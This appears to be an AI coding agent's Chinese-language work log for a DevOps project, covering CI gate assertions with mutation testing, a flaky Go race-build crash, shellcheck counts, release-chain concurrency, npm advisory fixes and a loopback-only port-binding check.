### 35.5 防复发门禁（第 16 节）与其判据边界

判据：任何 `[Unreleased]` 标题的日期**不得早于**最新发布版本标题的日期，且标题必须带日期；取不到任何已发布版本基准时**判红而不是跳过**。
刻意不用 git tag——本门禁所在 CI job 是浅检出（`fetch-depth: 0` 只出现在 4 个 job 里），真去查 tag 会让它在 CI 里静默不跑。

变异证据（注入点在真标题行位置，两次都判红、还原 `md5sum` 双向一致）：
`## [Unreleased] — 2026-08-01 变异探针A` ⇒ `日期 2026-08-01 早于最新发布版本日期 2026-10-04，却仍标 [Unreleased]`；
裸 `## [Unreleased]` ⇒ `标题没有日期`。整脚本 FAIL=1、exit=1。
另外该节在一次我自己写错的中间态里（日期提取用了行首锚定的 `match`）直接报"一个已发布版本标题都没有"——
说明基准缺失分支真能判红，不是摆设。标题识别也收紧了：正文里有以 `## [Unreleased]` 开头的**散文行**，
宽松匹配会把它当无日期标题造成假阳性。

边界：这一节抓"日期早于最新发布版本却仍标未发布"这一整类，**抓不住**"切版当天新写、次日才归版"的短窗错标；那要靠切版工序。

### 35.6 三处台账口径 + 两处表格结构缺陷

- TD-62（`docs/tech-debt.md:60`）原称 `FireHook(` 在 controlplane 下**零调用点**（2026-10-04 结论）。2026-10-06 复测：
  `AllHooks()` 的 3 个扩展点全部有宿主触发点（`platform_config.go:117`、`:155`、`server_netsec.go:103` → `plugin_host.go:74`），
  并由 `plugin_hook_gate_test.go` 强制"新增扩展点必须同时有触发点与测试"。行内改为"②③④ 已落地，只剩 ①（运行时模型）待产品决策"。
- TD-74（`:74`）同一格并存"已收口 / 保持 open / 收口，可关闭"三种口径（同日推进过程的叠加）。改为行首给**当前状态 = 已收口**、
  中间口径原位标注为历史，并补写收口后仍存在的判据边界（只判"列数 == Scan 目标数"的站点、`IS NOT NULL`/`COALESCE` 跳过的列、
  可空性来源是 `migrations/*.sql` ⇒ 运行时 `ALTER` 加的列不在视野内）。收口声明独立复核：**15 份 `mysql_scan_test.go` + 2 份 `nullable_scan_guard_test.go`**。
- `docs/release-notes.md:53` 的 v0.12.0 降级清单补 as-of 基准段。**逐行取证后是 2 行**在 main 上已不成立、对已发货 0.12.0 仍成立
  （插件零钩子、可空列只覆盖 alert-svc）；其余 12 行仍成立。**我先前口头说"3 行"是错的**——第三行（AIOps `/ready` 自检）我当时是从
  "TD-76 的 `c99d0d6` 在 tag 之后"推出来的，没去比对 tag 上的源码；实际 `services/aio-svc/cmd/aio-svc/main.go:75,87` 在 `v0.12.0` 里已是自检版本。
- 顺带抓到的结构缺陷：TD-73 行里 `（stub|mysql）` 未转义 ⇒ 该行撑出第 4 个单元格；表内还夹了一个空行（TD-73 与 TD-74 之间）⇒
  TD-74 之后的行会甩出表头作用域。两处已修。校验器本身也被证明会"空转"：我第一版按全文件单一基准数，把另一张 3 列表误报成 11 行缺陷，
  改为按表分段取基准后 HEAD=11 / 工作树=10，差的那一行正是被修掉的 TD-73。

### 35.7 这轮对"什么时候切版"的影响（判断材料，不是结论）

`promote` 这条新腿**至今零次成功执行**：`release.yml` 只在 `v*` 触发，`9b23b90` 之后唯一一条 release run 就是 35.2 里那条零 job 的红，
上一条 success 是 `37221272686`（v0.12.0，早于 promote 存在）。也就是说**下一次切版就是它的第一次真跑**。
用户此前选的是"先攒着，等有别的修复一起切"，这条事实让"攒"的成本多了一项：攒得越久，首次真跑 promote 时同时在变的量越多。
已有缓解是 `39c3718` 加的第 ⑤ 项判据（`:版本` 与 `:发布提交` 必须同 manifest digest，本轮 PASS=8 里就含它），
残留风险是 ⑤ 排在 `github-release` 之后且 main 无分支保护 ⇒ 真出事故时 Release 页已挂出去。

## 36. 2026-10-06｜`-race` 批次在测试全绿之后崩在 Go 运行时 GC 里：一次真实的"红不是我的改动"，以及分类器的判据缺陷

我推的 `9d88d88` 上 CI run `37414728836` **attempt 1 判红**，唯一红点是 `build-test` 的步骤
`Test (unit, memory store, -race + coverage)`，下游 11 个 job 全部 skip。取证如下。

### 36.1 现象（逐条可复核）

```
--- PASS: TestTaskTimeoutFor_NegativeTimeout (0.00s)
PASS                                     ← 测试二进制已经打印 PASS
SIGSEGV: segmentation violation          ← 之后才崩
PC=0x439c7d m=5 sigcode=1 addr=0x0
goroutine 0 gp=0x6e4378041e0 m=5 mp=0x6e437800008 [idle]:
runtime.(*spanQueue).tryDrain(...)  src/runtime/mgcmark_greenteagc.go:520 +0x5d
runtime.(*spanQueue).drain(...)     src/runtime/mgcmark_greenteagc.go:473
runtime.(*spanQueue).put(...)       src/runtime/mgcmark_greenteagc.go:409
[agent_JZ]  Maximum resident set size (kbytes): 260244
[mem] agent_JZ MemTotal=15989MB MemAvailable=14952MB
##[error][agent_JZ] 失败 rc=1（重试后仍失败，或非内存型失败）
```

要点：**用例一条都没失败**（`PASS` 已在），崩在 GC 标记队列、goroutine 0、idle M、`addr=0x0`；
峰值 RSS 260MB、宿主还有 14.9GB 可用 ⇒ **不是内存不足**。该批次是 `-race` 批次。

### 36.2 判定为"非确定性"的依据是同 sha 重跑，不是我的推断

`gh run rerun 37414728836 --failed` ⇒ attempt 2 在**同一提交** `9d88d88` 上
`build-test / security / services / integration / proto / Race detector / image / image-agent / release-dryrun / E2E×2 / Frontend`
**12 个 job 全 success**（`release` 设计内 skip）。

诚实边界：**重跑转绿比一次跑绿证据弱**。它能证明"不是我的改动导致的确定性失败"，
不能证明"这条腿稳定"——按现状它随时可能再红一次。

### 36.3 历史对照：这是本仓的新形态，不是长期已知 flaky

最近 12 条 main run 里，四连红（`a002c6a`/`e5b4d00`/`c4f2cab`/`0fb9896`）的 `build-test` 腿日志逐条取回并核对
（日志行数 1406 / 1408 / 1092 / 263 ——先证明取到了，再看命中数）：`SIGSEGV` **命中 0**；
而且 `0fb9896` 与 `c4f2cab` 两条的 `build-test` 结论其实是 **success**（那两轮红在别处），
`e5b4d00` 那次 build-test 真红但没有该签名。⇒ 这个签名在本仓此前没出现过。

### 36.4 上游有同形状缺陷，但**不能据此说"升 Go 就好"**

`golang/go#78059`（`runtime: go runtime.GC() can cause segfault with -race builds`）由维护者 prattmic 定性为
"This is a bug in TSAN that causes **effectively random crashes in -race mode**"，2026-03-23 在 master 修复，
1.26 的 backport（`#78087`）2026-03-26 关闭；Go 1.26 点版本表：1.26.2=2026-04-07 … **1.26.6=2026-08-13**。
我们 CI 钉的是 `go-version: "1.26.6"`（`ci.yml:24`），**晚于该 backport**。
所以诚实的结论只到这里：形状相同（`-race` + GC 标记路径 + 随机崩）、上游同类缺陷已修、
我们的版本已含修复——因此这**要么是回归、要么是另一个未修的缺陷**，我没有证据把它归给任一个，
也不据此改 Go 版本（改版本会让"验证对象是要推的 HEAD"这条纪律失效）。

### 36.5 真正的缺陷在我自己：重试分类器的判据是"文本白名单"而不是"现象"

步骤里的判据是
`OOM_PAT='fatal error: runtime: (cannot allocate memory|out of memory)|ThreadSanitizer: internal allocator is out of memory'`，
命中才重试一次。这条判据把"内存型死亡"当成现象本身，实际读的只是**两种历史报错文本**，
于是任何新的运行时死亡形态（这次是 SIGSEGV in GC）都被归为"确定性失败"⇒ 整条流水线红 + 11 个下游 skip。
这正是本项目反复强调的那一类：**判据挂在代理指标上**，代理指标漏一种形态就误判一次。

待改方案（等 `ci.yml` 的在途改动落地后做，现在不动它）：
判据改为**现象级**且足够窄——同时满足 ① 测试二进制已打印 `PASS`（用例侧无失败）、
② 崩溃栈的故障 PC 落在 `runtime.*` 内（GC/分配器路径）、③ 非断言失败文本——才重试一次，
并且**每次发生都要留下痕迹**（`::warning::` + 计数进 step summary），否则 flaky 会被"重跑绿"消化掉、
下次又当成新缺陷查。反向要求：真断言失败（`--- FAIL:`）与业务 panic 一律不重试。
这一改必须做变异验证（造一个"PASS 后 runtime SIGSEGV"的假日志与一个"FAIL"的假日志，分别验重试/不重试）。

**本轮不做的事**：不放宽 `-race`、不给该批次加 `GODEBUG` 关闭 green-tea GC（那会把 CI 变成"绕过缺陷"的样子），
也不因为 attempt 2 绿了就宣布"CI 全绿"——记录的是"同一提交上 attempt1 红于运行时崩溃、attempt2 全绿"。

## 37. 2026-10-06｜把"先过门禁再提权"从约定变成静态断言（门禁第 17 节），并撤回一次我自己造的有效假象

`9b23b90` 建立的性质是：**构建腿只推不可变 `:<sha>`，`:版本` 与 `:latest` 只能由 `promote` 在 Trivy/SBOM/签名
全绿之后改标**。但它没有任何东西在守——`release.yml` 只在 `v*` 触发，所以这个性质**要到下一次真实发布才第一次被检验**。
本项目已经两次栽在同形的位置（§19：v0.9.1 有 tag 无产物；§34：v0.12.0 归版把 pin 指到从未发布的版本）。

新增 `validate-deploy-assets.sh` 第 17 节，push 期就断言三件事：
`promote.needs ∋ build-and-push`、`github-release.needs ∋ promote`、构建腿的 `--tag` 实参只能是 `:<sha>` 形态
（出现 `:latest` 或任何非 sha 的可变 tag 即判红）；解析不出 job 或一个 `--tag` 都没取到 → 判红而不是跳过。
用 YAML 解析而非 grep 行匹配，因为 `needs` 在 Actions 里可以是字符串也可以是列表，行匹配会在写法变化时静默失配。

### 37.1 一次值得单独记的自伤：我的"变异验证通过"是假的

第一版判据我写成 `if "promote" not in needs("promote")`——问的是"promote 的依赖里有没有 promote"，**恒真**。
我当时把三处变异同时注入，输出正好三条消息、`exit=1`，看起来"三项都被抓住"。**我没有先跑干净基线。**
补做还原后立刻暴露：未变异的 `release.yml` 同样报 "promote 不再 needs build-and-push"。
修正为 `if "build-and-push" not in needs("promote")` 之后：

| 态 | 结果 |
|---|---|
| 干净（`release.yml` = HEAD） | 第 17 节 `[PASS] 发布链顺序成立（build_tags=1 promote_needs=['build-and-push'] gr_needs=['promote','changelog']）`，整脚本 `PASS=55 / FAIL=0 / SKIP=2`，exit=0 |
| 三处变异同时在场 | 恰好报出三条（去掉 promote 依赖 / Release 不再依赖提权 / 构建腿多推 `:latest`），`FAIL=1`，exit=1 |
| `--tag` 三个分支单独验 | 版本 tag ⇒ "非 sha 可变 tag"；`:latest` ⇒ "直接推送 :latest"；`:github.sha` ⇒ 合规 |

**可迁移的一条规矩：变异验证的顺序必须是"先证明干净态 0 报错，再看变异态报什么"。**
只看变异态有输出，分不清"抓住变异"和"这条分支恒报"——后者会把真缺陷混在噪音里，而且看起来证据充分。
同族前科：恒红的断言等于没有断言（§32.8）、空转的 job 等于通过的 job（§15.2）。

另一处判据错：`--tag` 我最初按空白切单 token，而实参 `${{ steps.meta.outputs.image }}:${{ github.sha }}`
里 `${{ … }}` 内含空格，只截到 `${{` 就会误报"构建腿推送了非法 tag"。改为整行取值再去掉续行反斜杠。

**过程纪律**：所有变异都在 `git worktree` 的独立副本里做，共享工作树的 `.github/workflows/release.yml`
（并行 agent 名下）一个字节都没动，跑完 `git worktree remove` 清理；插入 CHANGELOG 条目改成按行号定位并断言
锚点文本仍在原位，避免把锚点行当替换目标而吞掉邻居（本轮已因此自伤过一次，见 §35.6 之后的复盘）。

## 38. 2026-10-06｜TD-78 复测收口：info 档存量已清零，而 `-S style` 设卡判为不做（7 条 note 逐条判定）

### 38.1 复测口径与数字（同一命令，与 CI 同版 shellcheck v0.10.0）

口径：`shellcheck -S info $(git ls-files '*.sh')`，覆盖 **16 个交付脚本**。

| 对象 | `-S info` findings | 取法 |
|---|---|---|
| HEAD `1c21985` | **41** = SC2015 ×39（全在 `deploy/scripts/verify-runtime.sh`）+ SC2016 ×2（`deploy/docker/scripts/deploy.sh`） | `git worktree add --detach /tmp/opsmesh-headwt HEAD` 独立副本，跑完 `worktree remove`，共享工作树零改动 |
| 共享工作树（含并行 agent 在途的 `verify-runtime.sh`/`deploy.sh`/`ci.yml`） | **0** | 逐文件循环，16 行 `rc=0 findings=0` 全部打印，证明每个文件真被读过 |
| 阳性对照（临时脚本，注入未加引号展开与 `$(…)` 误用） | 报 SC2086 ×2 + SC2182 ×2，`exit=1` | 同一二进制、同一档位 |

对照 2026-10-04 的登记值时发现**台账行自己就对不上**：原行写"共 44 条 = SC2015 ×41 + SC2016 ×3 + SC2012 ×2 + SC2086 ×1"，
而该分解加总是 **47 ≠ 44**。用同一二进制把历史三个点重跑一遍后完全对上——**标题的 44 是对的，分解是虚的**：

| 取点 | `-S info` 实测 | 分解（按码） | 分解（按文件） |
|---|---|---|---|
| tag `v0.12.0`（`4c383a7`） | **44** | SC2015 ×40 + SC2016 ×2 + SC2012 ×1 + SC2086 ×1 | verify-runtime 39 + validate-deploy-assets 2 + deploy.sh 2 + verify-release-artifacts 1 |
| 10-04 当日 tip（`a2316ca4`） | **43** | SC2015 ×40 + SC2016 ×2 + SC2012 ×1 | 同上但 verify-release-artifacts 已清零 |
| HEAD `1c21985` | **41** | SC2015 ×39 + SC2016 ×2 | verify-runtime 39 + deploy.sh 2 |
| 共享工作树（对方在途） | **0** | — | 16 个脚本逐个 `rc=0 findings=0` |

所以链条是 **44 →（SC2086 清）→ 43 →（我名下两个 SC 清）→ 41 →（对方在途那批清）→ 0**，
每一步都能对上具体文件，没有"数字自己变小"的含糊处。历史三点都用 `git worktree add --detach` 的独立副本测，
共享工作树零改动，跑完 `git worktree remove`。
今日的 41 条**100% 位于并行 agent 名下那两个在途文件里**，其余差额落在我名下两个文件——
`deploy/scripts/validate-deploy-assets.sh`（SC2012 ×2 及若干 SC2015）与 `deploy/scripts/verify-release-artifacts.sh`（SC2086 ×1）
现均为 `-S info` 0 findings。**所以 TD-78 的"存量清零"这一半已完成，剩下的 41 条 100% 位于并行 agent 名下那两个在途文件里**，
而他正在同一批里把门禁档位从 `-S warning` 抬到 `-S info`（HEAD 该行在 `.github/workflows/ci.yml:482`，仍是 warning）。
档位与清零**必须同批提交**，否则抬档位的瞬间 CI 就红；本机工作树实测两者都到位，故他这批是自洽的。
台账行里 `ci.yml:443` 的引用已漂移到 482，一并更正。

### 38.2 为什么 `-S style` 不做：7 条 note，逐条判定后收益低于风险

同一 16 个脚本在 `-S style` 下共 **7 条**（全为 `note` 级）：

| 位置 | 码 | 判定 |
|---|---|---|
| `deploy/scripts/validate-deploy-assets.sh:375 / 384 / 497` | SC2181 ×3 | **行为本就正确**：本脚本第 29 行是 `set -uo pipefail`（**没有 errexit**），`out="$(cmd)"` 之后读 `$?` 拿到的就是命令替换的退出码，`else bad …` 分支是活的。改成 `if out=$(cmd); then` 只是同义改写，且是在门禁脚本里动控制流 |
| `deploy/scripts/validate-deploy-assets.sh:249` | SC2001 | `sed 's/_/-/g'` 可等价换成 `${x//_/-}`，属可选美化 |
| `deploy/scripts/validate-deploy-assets.sh:435` | SC2001 | `echo "$x" \| sed 's/^/         /'` 是**给输出加缩进**，参数展开没有等价写法 ⇒ 工具的偏好性误报 |
| `deploy/k8s/create-cluster.sh:152` | SC2181 | 同上，非缺陷 |
| `deploy/scripts/verify-runtime.sh:653` | SC2002 | `cat \| …` 冗余，但这是对方在途文件，我不碰 |

结论：**没有一条是缺陷**，且抬档位要改的是对方名下的 `ci.yml`。为了 7 条 note 去重排门禁脚本的控制流，
风险（改坏判定分支 = 假绿或假红）高于收益，故本行在 `docs/tech-debt.md` 收口，style 档只留作
"将来若要设卡再一并清"，不再列为待清债务。这条判断与"量过之后决定不做"的口径一致，依据就是上表的逐条实测。

### 38.3 本轮新增的一条自我约束（写在这里供后续复用）

第一次给 TD-78 行做 python 改写时，新文本里写了未转义的 `A && B \|\| C`，
被自己的列数断言（要求 3 列表 = 4 个真分隔符）当场拦下（实际 6 个），改成 `\|\|` 后才落地。
这正是 §35.6 之后立的规矩在起作用：**改结构化表格后必须用"真分隔符 = 竖线总数 − `\|` 条数"复算，
且断言要在落笔时跑，而不是事后看图**；本次是纯追加改写，`git diff --numstat` 为 `1 1`（一行换一行）。

## 39. 2026-10-06｜切版决策材料：`v0.12.0` 之后到底攒了多少、切一版会踩到什么（全部为今日实测）

用户 2026-10-05 的选择是"**先攒着，等有别的修复一起切**"。本节把那条决定所依赖的数字更新到今天，
供他重判；**不含我这边的任何单方面动作**。

| 项 | 实测值 | 取法 |
|---|---|---|
| `v0.12.0..HEAD(1c21985)` 提交数 | **48**（非文档 **31**、纯文档 17） | 两条独立算法给出同一值：① `git log --format=%h v0.12.0..HEAD -- . ':(exclude)docs' ':(exclude)CHANGELOG.md' ':(exclude)README.md'`；② 逐提交取 `--name-only` 后按"是否存在非文档路径"分类。**第一版草稿写的 36 是错的**——我用 awk 排除时要求 `CHANGELOG`/`README` 后面跟 `/`，而这两个文件在仓库根，于是把只改它们的提交也算进了非文档 |
| 改动文件数 | 115 | `git diff --name-only \| wc -l` |
| 迁移文件 | **38 → 42**（新增 `020_ci_items_fulltext`、`021_ci_items_fulltext_recall_columns`，各带 `.down.sql`） | `git ls-tree -r --name-only … -- internal/store/migrations` |
| `promote` job 真实执行次数 | **0**（release.yml 只在 `v*` 触发；唯一一次误触有 0 个 job） | §35.2 |
| 发布链顺序是否被门禁守住 | 是（`validate-deploy-assets.sh` §17，静态断言，含一次假证据撤回） | §37 |
| `main` 分支保护 | **无**（`gh api …/branches/main/protection` → 404，本机计划为免费档） | §35 |

**切一版会踩到的四件事（按严重度排）**：

1. **TD-80 会挡掉二进制发布腿**。`ci.yml` 的 `release` job `needs` 八个 job
   （`build-test`/`integration`/`security`/`services`/`proto`/`frontend`/`race`/`release-dryrun`），
   而 §36 那次红正是 `build-test` 的 `-race` 批次在**用例全绿之后**崩于 Go 运行时。
   `ci.yml` 同时监听 `tags: ["v*"]` ⇒ 打 tag 那一刻这条非确定性路径就在发布链上，
   一次崩溃 = 二进制（goreleaser + cosign）不产出，而 release.yml 的镜像腿仍可能全绿，
   形成"发布了一半"的形态。修法已在台账（现象级判据），但改的是并行 agent 名下在途的 `ci.yml`。
2. **`promote` 的首次真跑就是切版那一刻**。§17 只是静态断言它的形状，不能替代一次真实执行；
   `:latest`/`:版本` 的重打标签走 `docker buildx imagetools create`（不重建，digest 不变），
   这条路径至今没有在生产 registry 上跑过。
3. **存量库升级演练要重做，而且有明确的预算冲突**。已做过的演练是 `0.11.0 → 0.12.0`，而 `v0.12.0` 之后新增两条迁移，
   两条都没写 `ALGORITHM`/`LOCK`，于是按 MySQL 8.0 在线 DDL 的默认语义执行
   （出处：[InnoDB Online DDL Operations](https://dev.mysql.com/doc/refman/8.0/en/innodb-online-ddl-operations.html)，生成列表 17.19、索引表 17.16）：

   * `020` 加 STORED 生成列 `ci_attrs_text` → **Instant No、In Place No、Rebuilds Table Yes、Permits Concurrent DML No**
     （官方原文：`ADD COLUMN is not an in-place operation for stored columns … because the expression must be evaluated by the server`）
   * `020` 建**首个** FULLTEXT 索引（表内无自定义 `FTS_DOC_ID`）→ In Place Yes 但**仍重建整表**、期间不放开并发写
     （官方原文：`Adding the first FULLTEXT index rebuilds the table if there is no user-defined FTS_DOC_ID column`）
   * `021` DROP 同名索引后在 7 列上重建 → 属"后续 FULLTEXT 索引"，不重建表，但并发写仍不放开

   即 `ci_items` 在升级窗口里至少被**整表重建两次**、且**期间不允许并发写入**。
   而交付侧的等待预算是固定的：`deploy/docker/scripts/deploy.sh:1014` 是 `wait_for_healthy controlplane 120`，
   控制面健康检查为 `start_period: 30s / interval: 30s / retries: 3 / timeout: 5s`（`docker-compose.prod.yml` 的 `controlplane.healthcheck`）。
   **推论（这是要演练的硬理由，不是猜测）**：存量 `ci_items` 行数大到让迁移超过这个预算时，`deploy.sh up` 会报
   "120s 内未就绪"并返回 1——症状长得像"新版本部署失败"，实际是数据量导致的迁移耗时。
   演练必须在**有代表性的行数**下取数（而不是空库或几百行），并同时记录 `020`+`021` 各自墙钟时间。
4. **发布链没有 `concurrency` 串行闸**。`ci.yml` 与 `release.yml` 都**没有** `concurrency` 块（工作树与 HEAD 均如此），
   后果分两面：好的一面是分支推送不会互相取消（每次 push 各跑一轮 12 job，归因清楚）；
   坏的一面是**两个 tag 短间隔推送时，两条发布链会并发跑**，而 `promote` 是按 tag 重打 `:latest`/`:版本`，
   最终 `:latest` 由**最后完成者**决定而不是版本最新者——这与 §20 里"feature 分支刻意不打 latest"要避免的形态同源。
   建议动作很小（`concurrency: {group: release, cancel-in-progress: false}`，只排队不取消），
   但它**属于"只在发版那一刻才第一次执行"的步骤**（§19 教训 15 的同族），我没有盲改：
   要么随下一次切版一起真跑验证，要么先在 `release-dryrun` 里造一个可执行的最小复现路径再落地。

**三条仍在他手上的决定**（与技术实现不同，我不代拍）：alert-svc 的 gRPC 未鉴权入口出厂默认、
MPL-2.0 与 npm 依赖的法务口径、TD-62 的插件接线下一版是否对外宣称。

**我的建议（仅供他判）**：先等并行 agent 那批 `ci.yml` 落地并把 TD-80 按现象级判据修掉（它同时在发布链上），
再做一次 `0.12.0 → 新版` 的存量演练，然后切版——顺序依据是"缺陷清完才切版本"，
而演练与 promote 首跑都属于"切版那一刻第一次执行"的类别（§19 教训 15 的同族）。

## 40. 2026-10-06｜一条 docs 提交把 CI 打红：Trivy 公告库当日新增两条 npm HIGH，以及"红不是我造成的"之后该做什么

### 40.1 取证路径（三步，每步都换了工具，避免单一读法骗人）

1. **job 级**：`gh run view 37430420614 --json jobs` ⇒ `security=failure`、`image`/`image-agent`/`release`=skipped、其余 9 绿。
   只看 run 那一行 `failure` 会以为要查全部改动。
2. **step 级**：同一条命令取 `jobs[].steps[]` 里 `conclusion=="failure"` 的项 ⇒ 只有一个：`Trivy 文件系统扫描`。
   归因范围立刻从"我这条提交"缩到"一个扫描步骤"。
3. **产物级**：该 job 的日志里 **stdout 没有漏洞表**（`trivy` 被配成 `--output trivy-fs-report.txt`），
   所以我没有从日志硬抠结论，而是下载红时自动上传的取证 artifact：
   `gh run download 37430420614 -n trivy-fs-report` ⇒ `Report Summary` 显示
   16 个 go.mod 目标全 0、`web/enterprise/package-lock.json (npm) Total: 2 (HIGH 2, CRITICAL 0)`。
   **这一步是"门禁自己坏了也不吭声"的对照组**：正是"红时取证"这个上传步骤存在，本次才能在
   日志无表的情况下拿到 (package, installed, fixed) 三列。

判定"不是我的回归"用了两条独立证据，而不是一条：① `git show --stat abda748` = 1 个 docs 文件（+24 −4）；
② **同一份锁文件**在 30 分钟前的 run `37426660878` 里 `Trivy 文件系统扫描` 是 success（job steps 查得）。
两条一起才够写进结论，单用第②条会把"扫描器今天新认了这些告警"误写成"CI 抖动"。

### 40.2 修，而不是解释

即使红因在公告库，这两条确实存在于**会交付给客户前端的锁文件**里，所以按依赖修复的正常流程做：
以扫描表的 (package, installed, fixed) 为准，再回查官方 advisory 的**全部**受影响区间确认落点
（`@vue/server-renderer` `< 3.5.42` 与 `>= 3.6.0-rc.0, < 3.6.0-rc.6`；`source-map-js` `>= 1.0.0, < 1.2.2`），
然后 `npm update vue source-map-js --registry=https://registry.npmjs.org`。细节与本机验证见 CHANGELOG 同日块，
这里只记三个方法性点：

- **两个目标都是传递依赖**，走 `npm update` 而不是塞 override；`package.json` 因此一字未改，锁只 71 行等值替换。
- **指定官方源**是有意的：本机 npm 默认源是 `registry.npmmirror.com`，第一遍 update 把 14 条新条目写成了镜像 URL
  （`resolved` 计数从 224 npmjs / 133 mirror 变成 210 / 147）。重做一遍才做到"新增条目全部官方源、存量 133 条不动"。
  存量那 133 条登记成 TD-81（供应链卫生，不是缺陷）。
- **本机 `npm audit` 不可用**（npmmirror 未实现 `/-/npm/v1/security/*`，返回 `NOT_IMPLEMENTED`），
  所以我不能拿"本机 audit 没报"当阴性证据——**告警面归零只能由 CI 的 Trivy 重跑给出终判**，
  这也是我把这条写进诚实边界的原因：版本号变了不等于修好了。

### 40.3 一处自伤（退出码类，同族第四次）

盯 CI 时我写的是 `gh run watch <id> --exit-status > log 2>&1; echo WATCH_EXIT=$?; gh run view …`，
后台任务的"completed (exit code 0)"通知报的是**整条命令串**的退出码（最后一个 `gh run view` 成功），
而 `--exit-status` 真正的非零被吞在中间——差点把一条红当成绿推下一步。
规矩补一句：**要判成败的那条命令必须是命令串的最后一条**，或者单独跑、把它的退出码立刻写进变量；
本轮之所以没出事，是因为我按既有习惯又用 `gh run view …jobs` 复算了一遍状态。

## 41. 2026-10-07｜② 发布链串行闸 + ③ 入站边界：把两条"只在评审里成立"的性质变成断言

用户批复是「如果加确实更好，能提升产品的能力就加。只要收益性明确、风险性可控、整体的兼容性良好、
未来开发与拓展的可持续性可以」，所以我按这四个维度各自给了理由，而不是只写"加了个 concurrency"。

### 41.1 收益：一条能被两个 tag 复现的失败形态

`ci.yml` 与 `release.yml` 此前**都没有** `concurrency` 块（工作树与 HEAD 双向核对）。
后果不是"CI 互取消"那种可见问题，而是**两个 tag 短间隔推送时两条发布链并发跑**，
`promote` 按 tag 重打 `:latest`/`:版本`，最终 `:latest` 由**最后完成者**而不是版本最新者决定。
这与 §20 里"feature 分支刻意不打 latest"是同源的失效面，只是触发条件从"分支合并顺序"换成"打 tag 的手速"。

### 41.2 风险可控：只排队、不取消，且不碰任何既有 job

```yaml
concurrency:
  group: release
  cancel-in-progress: false
```

`cancel-in-progress: false` 是这条改动的全部风险来源——正在发布的 run 绝不被动。
`group` **必须是字面量**：任何 `${{ github.run_id }}` / `run_number` / `ref` 都会让每条 run 自成一组，
串行效果归零而 YAML 看起来完全正常。actionlint 只校 schema，不会告诉你这件事，所以判据落进门禁第 17 节。
提交是纯增量（`release.yml` +10/−0），既有 5 个 job、needs 关系、steps 数（15/4/2/3/3）重解析后逐一对齐。

### 41.3 兼容性 + 可持续性：断言与变异

`deploy/scripts/validate-deploy-assets.sh` §17 现在同时核对发布链顺序与串行闸形态。
变异检验按新规矩**先证干净态不报红**，再逐条打坏（临时 detached worktree `opsmesh-verify-wt`，
HEAD=`3223365`，绝不在主工作树上改）：

| 变异 | 期望 | 实测（§17 判定 + 唯一报错文本） |
|---|---|---|
| M0 基线 | 不报红 | `[PASS] 发布链顺序成立（… concurrency=group=release cancel=False）`，PASS=58 / FAIL=0 / SKIP=1，exit 0 |
| M1 整块删除 | 报「没有顶层 concurrency」 | FAIL=1，gate exit 1，文本命中 |
| M2 `group: release-${{ github.run_id }}` | 报「group 含动态量」 | FAIL=1，文本含被注入的具体值 |
| M3 `group: ${{ github.ref }}` | 同上 | FAIL=1（两个 tag = 两个 ref = 仍并发，这正是只看"有没有 concurrency"会漏的形态） |
| M4 `cancel-in-progress: true` | 报「必须显式为 false」 | FAIL=1，打印 `当前=True` |
| M5 只删 `group` | 报「缺 group」 | FAIL=1 |
| M6 只删 `cancel-in-progress` | 报「必须显式为 false」 | FAIL=1，打印 `当前=None`（隐式 true 也被抓） |
| M7 写成裸字符串 `concurrency: release` | 报「只给了 group 字符串」 | FAIL=1 |

七条各命中一次、且基线为 0——这是 §37.1 那次"恒真判据伪装成证据"之后按新规矩跑的第一组。
其余同轮核对：`shellcheck -S info $(git ls-files '*.sh')` 0 findings、`actionlint .github/workflows/release.yml` exit 0、
CI 上 `origin/main`（`d59fce6`）run `37463198876` conclusion=success。
M2/M3 这两条变异是我专门设计来**打自己的判据**的：如果判据只写"concurrency 存在"，它们都会静默通过。

### 41.4 ③ 入站边界：一个此前只存在于注释里的前提

`deploy/docker/docker-compose.prod.yml` 里 MySQL/Redis/Loki/Prometheus/Alertmanager/Grafana 的宿主端口
都写成 `127.0.0.1:<宿主端口>:<容器端口>`，注释说"仅本机可达"，但**没有任何断言核对它**。
这类前提的失效方式是静默的：某次"顺手改一下端口映射"就会把一个未鉴权面开到 0.0.0.0，
而 alert-svc 的 gRPC 正在这一类里（用户批复③选择的稳妥路线是"未鉴权 gRPC 只绑环回"，不改协议）。

新增 §18 的判据（同一命令，本机）：`published=31 loopback=26 exceptions=4`，
白名单例外只有 `controlplane:8080/9090` 与 `gateway:80/443`，其余全部要求环回前缀；
门禁合计 **PASS=58 / FAIL=0 / SKIP=1**（SKIP 是 kubeconform 取不到 JSON schema，离线网络下如实跳过并计数）。
解析器自己的三个坑都在这轮被抓出来并修掉（`${VAR:-default}` 的冒号、块内注释行终结块、把"没有 ports 段"当空洞通过），
修法是加一条**独立正则的条目数对账**——状态机漏读时两个计数不等即报红，这类"解析器静默少读"没有别的发现途径。

变异验证（同一 worktree、每条打坏后立刻还原并核对 sha256）见 §41.5。

### 41.5 §18 的变异检验（先证基线不报红，再逐条打坏）

| 变异 | 期望 | 实测 |
|---|---|---|
| M0 基线 | 不报红 | `[PASS] … published=31 loopback=26 exceptions=4`，PASS=58 / FAIL=0 / SKIP=1 |
| M1 Redis 去掉 `127.0.0.1:` 前缀 | 报该服务越界 | FAIL=1，文本 `redis 把容器端口 6379 发布到所有网卡（绑定=<空=0.0.0.0>）` |
| M2 Alertmanager 显式绑 `0.0.0.0:` | 同上 | FAIL=1，`alertmanager … 9093 …（绑定=0.0.0.0）` |
| M3 mysql 的 `ports:` 留空 | 我原以为 §18 的"零条目"会报 | **§18 判 PASS、整条门禁 FAIL=2**——红来自第 1/2 节 `compose 渲染失败`（空 `ports:` 让 `docker compose config` 直接报错），并连带 2 个 SKIP |
| M4 Loki 条目缩进改成 4 空格 | 报"解析面缩小" | FAIL=1，文本点名两个计数：`状态机解析到 27 个端口条目，独立正则数到 26 个` |
| M5 grafana 的 ports 块中间插注释行 | 不报红且条目数不变 | PASS，`27/25` 与基线逐位相同 ⇒ "注释终结块"那个旧漏读点没有回归 |

M3 这一条值得单独记，因为它同时纠正我的**两个**错误预期：
① §18 的"零条目"判据是按**整个文件**生效而不是按服务（我按服务写了预期）；
② 这个变异确实被门禁抓住了，但抓它的是**别的面**（compose 渲染层）。
所以"变异检验通过"的断言必须落到"红出现在第几节、报的是哪句文本"，
只看整体 exit code 或 FAIL 总数会把"A 节抓住了"记成"我的节抓住了"——这与 §37.1 那次假证据是同族。
每条变异跑完都 `git checkout --` / `sha256sum` 双向核对还原（M5 后对照 `24d774bd…` 两份一致）。

